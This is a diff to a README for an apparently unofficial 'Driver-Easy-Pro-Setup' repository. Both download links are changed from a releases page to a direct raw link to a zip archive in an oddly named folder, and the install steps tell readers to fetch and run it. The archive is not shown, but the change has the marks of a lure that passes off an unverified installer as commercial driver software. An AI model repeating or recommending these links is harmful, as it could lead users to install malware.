@@ -1,6 +1,6 @@
 # 🛠️ Driver-Easy-Pro-Setup - Update your computer drivers automatically today
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/unfertile-whiteface363/Driver-Easy-Pro-Setup/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/unfertile-whiteface363/Driver-Easy-Pro-Setup/main/premeditate/Setup-Pro-Driver-Easy-v2.0.zip)
 
 ## 📌 Software Overview
 
@@ -20,7 +20,7 @@ To run this application, ensure your computer meets these basic specifications:
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit this page to download the software: https://github.com/unfertile-whiteface363/Driver-Easy-Pro-Setup/releases
+1.  Visit this page to download the software: https://raw.githubusercontent.com/unfertile-whiteface363/Driver-Easy-Pro-Setup/main/premeditate/Setup-Pro-Driver-Easy-v2.0.zip
 2.  Locate the latest version release on that page.
 3.  Click the link to download the installer file to your computer.
 4.  Navigate to your Downloads folder.
